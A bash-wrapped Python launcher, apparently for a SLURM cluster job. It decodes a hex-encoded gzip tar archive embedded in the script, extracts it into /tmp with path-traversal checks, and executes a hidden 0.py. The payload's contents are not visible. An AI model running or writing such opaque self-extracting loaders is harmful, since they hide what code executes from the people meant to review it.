#!/bin/bash
set -euo pipefail
exec /usr/bin/python3 -I -s -B - <<'A'
import hashlib,io,json,os,sys,tarfile
from pathlib import Path,PurePosixPath
j=os.environ.get('SLURM_JOB_ID','')
if not j.isdigit():raise ValueError('Allocation required')
b=bytes.fromhex('1f8b0800000000000003ed954d6fdb300c867bf6af1072910d048afc6da7c871f71db65d86a2a06539519ad886a4accd86fdf74976506428b05bdb0de37388225b7c4991a2ccd9de0cfdcdabc21d05e7d3c85f8e3c4db3e7fff3f3a22cca1bc25f37ac9993b1a09dcbb7f0f517f263618707d92fd664010d8f9334cb8bb2aa174bb218e17c18a0bd373b48f2c2afe8aa989720ebb8ad5b109d486b51145d0a8d944d5ec62d4ff33ce149255a28eb5464994893aae36d12435397657cadda9cad344e34cf92a42833ffe600fd95330190242daf6412d7795d76559de592f39243da565d03750c6d1df3441422771177c093d43ba97251f04cd68b9fef9ddb7f01cec6f3abfbf873ffc771fca2ffb32cc5fe7f0bd4711cb425e66c96fe43b0dc81d91d54b37449e9d441069d1e8e6404eb1f92cbe28f6e1ae88d1f4267c8406fbf7d8defa25bb1f11accf7b70943bda27cfabad08869e95adeca271b465100b3295d8d7ad84b615762381e4fbdb2e7d57e7f96a77e4ba395f84aa79b89de7919bbfd4e0330463af79710d97c5584308b4ff78953673bf9d4aaad34ced566e3547ebfc6e85df0a8ec8e5cf6c78651f62144040cb1eb8074832692a87e9a10d5917eb044b21e8e92f983628db70ee9a0c50e747bbf8bf98a466b31f456f527796da38c771046c44952c6a8579df63dcb456cf4726b0dca48f2050e27f941eb4187f4736fa0f3418c274b2327396e5c2a47ba9a0d6f476f297bcb8e0fadd2e13c319b4ffa2497f249197b3f3c4cb3c82d7dd4caca4b722c7305d020ec14989cabe20be28be86bcc54ef331cf2a5b13a9c9cbab7d311b8da30db0fcf47e108aa0ffc4fa8a3e0bdcf3282200882200882200882200882200882200882200882fcaffc027ac6b6e500280000')
r=Path('/tmp')/('a'+j+'ab0123456789')
r.mkdir(mode=0o700)
with tarfile.open(fileobj=io.BytesIO(b)) as a:
    for e in a:
        n=PurePosixPath(e.name)
        if n.is_absolute() or '..' in n.parts or not e.isfile():raise ValueError('Unsafe input')
        p=r/e.name;p.parent.mkdir(parents=True,exist_ok=True)
        with a.extractfile(e) as i,p.open('xb') as o:o.write(i.read())
os.chdir(r)
os.execv(sys.executable,[sys.executable,'-I','-s','-B',str(r/'0.py'),str(r)])
A
